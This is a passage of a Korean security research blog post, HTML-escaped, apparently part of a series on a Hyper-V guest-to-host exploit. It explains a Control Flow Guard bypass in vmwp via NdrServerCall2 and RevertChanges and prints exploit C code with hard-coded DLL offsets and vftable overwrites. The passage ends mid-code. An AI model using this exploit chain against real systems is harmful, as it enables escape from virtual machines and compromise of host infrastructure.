&lt;p&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image6.png&#34; alt&gt;&lt;br&gt;&amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;this&lt;/code&gt;&amp;#xC640; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xBCF5;&amp;#xC0AC;&amp;#xB420; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC778; &lt;code&gt;pBuff&lt;/code&gt;&amp;#xAC00; &amp;#xBCF4;&amp;#xC774;&amp;#xB294;&amp;#xB370;&amp;#xC694;? &lt;code&gt;this+0x14&lt;/code&gt;&amp;#xC758; 4&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xBC14;&amp;#xC774;&amp;#xD2B8; &amp;#xC218;, &lt;code&gt;this+0x18&lt;/code&gt;&amp;#xC744; 8&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xB420; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;this&lt;/code&gt;&amp;#xAC00; &amp;#xC788;&amp;#xC9C4; &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC774; &amp;#xB610;&amp;#xD55C; &lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xB85C; &amp;#xC870;&amp;#xC791;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0; &amp;#xBCF5;&amp;#xC0AC;&amp;#xB420; &amp;#xD06C;&amp;#xAE30;&amp;#xC640; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xD3EC;&amp;#xD568;&amp;#xC2DC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xAE30;&amp;#xB9CC; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xC8E0;. &amp;#xB0B4;&amp;#xBD80;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;memcpy&lt;/code&gt;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xBA70; &lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;&amp;#xC740; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC790;&amp;#xB9C8;&amp;#xC790; return&amp;#xD558;&amp;#xAC8C; &amp;#xB420; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. CFG&amp;#xB97C; &amp;#xBC14;&amp;#xBCF4;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4;&amp;#xBC84;&amp;#xB9AC;&amp;#xB294; &amp;#xAC70;&amp;#xC8E0;!&lt;/p&gt;
&lt;h3 id=&#34;CreateFileA&#34;&gt;&lt;a href=&#34;#CreateFileA&#34; class=&#34;headerlink&#34; title=&#34;CreateFileA&#34;&gt;&lt;/a&gt;&lt;code&gt;CreateFileA&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;GetCopy&lt;/code&gt;&amp;#xB97C; &amp;#xB05D;&amp;#xC73C;&amp;#xB85C; CFG&amp;#xAC00; &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xB418;&amp;#xC5C8;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC5B4;&amp;#xB5A4; &amp;#xD568;&amp;#xC218;&amp;#xB3C4; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAD73;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC77C; &amp;#xD544;&amp;#xC694;&amp;#xB3C4; &amp;#xC5C6;&amp;#xC774; &amp;#xC2E4;&amp;#xD589; &amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; &amp;#xADF8; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C;&amp;#xB3C4; &amp;#xC81C;&amp;#xC5B4; &amp;#xD750;&amp;#xB984;&amp;#xC744; &amp;#xC870;&amp;#xC791;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB41C; &amp;#xAC83;&amp;#xC774;&amp;#xC8E0;. &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xD30C;&amp;#xD2B8; 4&amp;#xC5D0;&amp;#xC11C; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xC558;&amp;#xB2E4;&amp;#xC2DC;&amp;#xD53C; vmwp&amp;#xB294; &amp;#xC790;&amp;#xC2DD; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;CreateProcess&lt;/code&gt;&amp;#xB85C; &amp;#xBA4B;&amp;#xC788;&amp;#xAC8C; &amp;#xACC4;&amp;#xC0B0;&amp;#xAE30;&amp;#xB97C; &amp;#xB744;&amp;#xC6B0;&amp;#xB294; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;C:\Users\Public&lt;/code&gt; &amp;#xBC11;&amp;#xC5D0; &amp;#xC544;&amp;#xBB34; &amp;#xD30C;&amp;#xC77C;&amp;#xC774;&amp;#xB098; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xC758; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;!&lt;/p&gt;
&lt;h1 id=&#34;Payload&#34;&gt;&lt;a href=&#34;#Payload&#34; class=&#34;headerlink&#34; title=&#34;Payload&#34;&gt;&lt;/a&gt;Payload&lt;/h1&gt;&lt;p&gt;&amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC758; &amp;#xB300;&amp;#xB7B5;&amp;#xC801;&amp;#xC778; &amp;#xAD6C;&amp;#xC870;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xADF8;&amp;#xB9BC;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image7.png&#34; alt&gt;&lt;br&gt;&amp;#xBCF4;&amp;#xAE30;&amp;#xB9CC; &amp;#xD574;&amp;#xB3C4; &amp;#xC5B4;&amp;#xC9C8;&amp;#xC5B4;&amp;#xC9C8;&amp;#xD574;&amp;#xC9C0;&amp;#xB294; &amp;#xC800; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xAC00; OOB Write&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD0C0;&amp;#xAC9F; &amp;#xD799;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC0BD;&amp;#xC785;&amp;#xB420; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC758; &amp;#xAC00;&amp;#xC7A5; &amp;#xC55E; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xB178;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC740; &amp;#xAC01; 0x100 &amp;#xD06C;&amp;#xAE30;&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; CFG &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xC5D0;&amp;#xC11C; &amp;#xC124;&amp;#xBA85;&amp;#xD55C; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xAC01; &amp;#xB178;&amp;#xB4DC;&amp;#xB294; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC774;&amp;#xC790; &lt;code&gt;RegistrationStore::Context&lt;/code&gt;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCD94;&amp;#xAC00;&amp;#xB85C; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xB178;&amp;#xB4DC;&amp;#xB294; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xC774;&amp;#xAE30;&amp;#xB3C4; &amp;#xD558;&amp;#xB124;&amp;#xC694;. &amp;#xBB34;&amp;#xD2BC; &amp;#xC800;&amp;#xB294; &amp;#xC774; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xB97C; 0x100 &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB85C; &amp;#xC7A1;&amp;#xACE0; &amp;#xC55E;&amp;#xC758; 0x60&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB294; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC774;&amp;#xACE0; &amp;#xB098;&amp;#xBA38;&amp;#xC9C0; &amp;#xACF5;&amp;#xAC04;&amp;#xC744; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC758; &lt;code&gt;Buffer&lt;/code&gt;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xC81C;&amp;#xAC00; &amp;#xC791;&amp;#xC131;&amp;#xD55C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5C8;&amp;#xB294;&amp;#xC9C0; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;!&lt;/p&gt;
&lt;h2 id=&#34;Exploit-Code&#34;&gt;&lt;a href=&#34;#Exploit-Code&#34; class=&#34;headerlink&#34; title=&#34;Exploit Code&#34;&gt;&lt;/a&gt;Exploit Code&lt;/h2&gt;&lt;h3 id=&#34;Variables&#34;&gt;&lt;a href=&#34;#Variables&#34; class=&#34;headerlink&#34; title=&#34;Variables&#34;&gt;&lt;/a&gt;Variables&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;__int64 rpcrt4_guard_check_icall_fptr = RPCRT4 + &lt;span class=&#34;hljs-number&#34;&gt;0xe94f0&lt;/span&gt;, KernelBase_VirtualProtect = KernelBase + &lt;span class=&#34;hljs-number&#34;&gt;0x64030&lt;/span&gt;, ret = RPCRT4 + &lt;span class=&#34;hljs-number&#34;&gt;0x58480&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x1e&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//RPCRT4!NdrServerCall2 + 0x1e =&amp;gt; ret&lt;/span&gt;


&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* payload = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)VideoDirtListenerOffset;
PRPC_MESSAGE pRpcMsg = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
PRPC_SERVER_INTERFACE pServerInterface = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
PMIDL_SERVER_INFO pMidl = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
__int64* node = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

__int64 start = VideoDirtListener, DispatchTable = start + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; * INDIRECT_CALL_CHAIN_LEN, MidlStubDesc = DispatchTable + &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(__int64) * INDIRECT_CALL_CHAIN_LEN, MidlSrvInfo = MidlStubDesc + &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(MIDL_STUB_DESC), ServerInterface = MidlSrvInfo + &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(MIDL_SERVER_INFO);
__int64 ProcStringAddress = ServerInterface + &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(RPC_SERVER_INTERFACE), FmtStringOffsetAddress = ProcStringAddress + &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;, vftable = FmtStringOffsetAddress + &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;) * &lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* ProcString = ((&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)VideoDirtListenerOffset) + (ProcStringAddress - start);
&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; ProcStringCursor = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
WORD* FmtStringOffset = ((&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)VideoDirtListenerOffset) + (FmtStringOffsetAddress - start);
&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; INDIRECT_CALL_CHAIN_LEN; i++) {
	FmtStringOffset[i] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xBCC0;&amp;#xC218;&amp;#xB4E4;&amp;#xC744; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD0C0;&amp;#xAC9F; &amp;#xD799;&amp;#xC5D0;&amp;#xC11C; &amp;#xC720;&amp;#xCD9C;&amp;#xD55C; DLL &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;, &lt;code&gt;VirtualProtect&lt;/code&gt; &amp;#xB4F1;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xBCC0;&amp;#xC218;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;start&lt;/code&gt;, &lt;code&gt;DispatchTable&lt;/code&gt; &amp;#xB4F1; &amp;#xC815;&amp;#xC218;&amp;#xD615; &amp;#xBCC0;&amp;#xC218;&amp;#xB4E4;&amp;#xC740; vmwp&amp;#xC758; &amp;#xAC00;&amp;#xC0C1; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xAE4C; &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xBCF8; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC; &amp;#xAD6C;&amp;#xC870;&amp;#xC5D0;&amp;#xC11C; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xB4EF;&amp;#xC774; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC; &amp;#xC548;&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E4;&amp;#xC591;&amp;#xD55C; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB4E4;&amp;#xC774; &amp;#xC11C;&amp;#xB85C;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC788;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xBBF8;&amp;#xB9AC; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xACC4;&amp;#xC0B0;&amp;#xD574;&amp;#xB450;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8; &amp;#xC678;&amp;#xC5D0; &amp;#xD3EC;&amp;#xC778;&amp;#xD130; &amp;#xBCC0;&amp;#xC218;&amp;#xB4E4;&amp;#xC740; vmwp&amp;#xAC00; &amp;#xC544;&amp;#xB2CC; Exploit &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC4F8; &amp;#xB54C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;vftable&#34;&gt;&lt;a href=&#34;#vftable&#34; class=&#34;headerlink&#34; title=&#34;vftable&#34;&gt;&lt;/a&gt;vftable&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;VideoDirtListenerEntries[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = combase + &lt;span class=&#34;hljs-number&#34;&gt;0x17d9b0&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//vmemulateddevices!VideoDirtListener::PrepareSelf -&amp;gt; combase!RegistrationStore::Context::RevertChanges&lt;/span&gt;
VideoDirtListenerEntries[&lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt; / &lt;span class=&#34;hljs-number&#34;&gt;0x8&lt;/span&gt;] = RPCRT4 + &lt;span class=&#34;hljs-number&#34;&gt;0x58480&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//RPCRT4!NdrServerCall2&lt;/span&gt;
VideoDirtListenerEntries[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = DispatchTable + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; - &lt;span class=&#34;hljs-number&#34;&gt;0x70&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;// -&amp;gt; RPCRT4!NdrpServerUnmarshal&amp;apos;s indirect call must return 0, point to VirtualProtect &amp;amp; make it fail to return 0&lt;/span&gt;
VideoDirtListenerEntries[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x33307c89abcdef&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//NdrStubCall2+0x4c0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;VideoDirtlistenerEntries&lt;/code&gt;&amp;#xB294; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xC758; vftable&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xBC18;&amp;#xBCF5;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &lt;code&gt;VideoDirtListener::PrepareSelf&lt;/code&gt;&amp;#xB97C; &lt;code&gt;combase!RegistrationStore:Context:RevertChanges&lt;/code&gt;&amp;#xB85C; &amp;#xBC14;&amp;#xAFD4;&amp;#xC8FC;&amp;#xACE0; &lt;code&gt;RevertChanges&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB420; &amp;#xD568;&amp;#xC218;&amp;#xB294; &lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xB85C; &amp;#xC870;&amp;#xC791;&amp;#xD574;&amp;#xB450;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC640; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;RpcRaiseException&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xB9C9;&amp;#xAE30; &amp;#xC704;&amp;#xD574; 0&amp;#xBC88;&amp;#xC9F8;, 1&amp;#xBC88;&amp;#xC9F8; &amp;#xC5D4;&amp;#xD2B8;&amp;#xB9AC;&amp;#xB97C; &amp;#xC218;&amp;#xC815;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;ProcDesc-amp-ProcString&#34;&gt;&lt;a href=&#34;#ProcDesc-amp-ProcString&#34; class=&#34;headerlink&#34; title=&#34;ProcDesc &amp;amp; ProcString&#34;&gt;&lt;/a&gt;ProcDesc &amp;amp; ProcString&lt;/h3&gt;&lt;p&gt;&lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC778;&amp;#xC790;&amp;#xB97C; Unmarshaling&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xD544;&amp;#xC694;&amp;#xD55C; ProcString&amp;#xACFC; ProcDesc&amp;#xB3C4; &amp;#xC798; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC918;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xB178;&amp;#xB4DC;(&lt;code&gt;VideoDirtListener&lt;/code&gt;)&amp;#xB294; &amp;#xB8E8;&amp;#xD504;&amp;#xB97C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &lt;code&gt;RevertChanges&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xC5ED;&amp;#xD560;&amp;#xB9CC; &amp;#xD558;&amp;#xACE0; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xB178;&amp;#xB4DC;&amp;#xBD80;&amp;#xD130; &amp;#xCC28;&amp;#xB840;&amp;#xB85C; &lt;code&gt;VirtualProtect&lt;/code&gt;, &lt;code&gt;GetCopy&lt;/code&gt;, &lt;code&gt;CreateFileA&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC778;&amp;#xC790;&amp;#xC758; &amp;#xC218;&amp;#xB294; &amp;#xC774;&amp;#xBBF8; &amp;#xC815;&amp;#xD574;&amp;#xC838; &amp;#xC788;&amp;#xC73C;&amp;#xB2C8; &amp;#xC774;&amp;#xC5D0; &amp;#xB9DE;&amp;#xCDB0; ProcString&amp;#xACFC; ProcDesc&amp;#xB97C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC18;&amp;#xBCF5;&amp;#xBB38;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C; i&amp;#xB294; ProcNum&amp;#xC774;&amp;#xC790; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &amp;#xBC88;&amp;#xD638;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xADF8; &amp;#xC678;&amp;#xC5D0; vftable &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xBCC0;&amp;#xACBD;&amp;#xD558;&amp;#xACE0; &lt;code&gt;RevertChanges&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &lt;code&gt;Blink&lt;/code&gt;&amp;#xB97C; &amp;#xB2E4;&amp;#xC74C; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xD558;&amp;#xACE0; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC758; &amp;#xD544;&amp;#xB4DC;&amp;#xB4E4;&amp;#xB3C4; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC774;&amp;#xD6C4; switch-case&amp;#xB85C; i&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &lt;code&gt;BufferLength&lt;/code&gt;, &lt;code&gt;NumberParams&lt;/code&gt;, &lt;code&gt;StackSize&lt;/code&gt; &amp;#xB4F1;&amp;#xC744; &amp;#xC124;&amp;#xC815;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xD6C4; &lt;code&gt;NumberParams&lt;/code&gt;&amp;#xAC1C;&amp;#xC758; &lt;code&gt;Param&lt;/code&gt;&amp;#xC744; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; INDIRECT_CALL_CHAIN_LEN; i++) {
	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* ProcDesc = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	WORD* Param = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	node = payload + i * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;;
	node[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = vftable;
	node[&lt;span class=&#34;hljs-number&#34;&gt;0x58&lt;/span&gt; / &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;] = start + (i + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) * &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0x50&lt;/span&gt;;
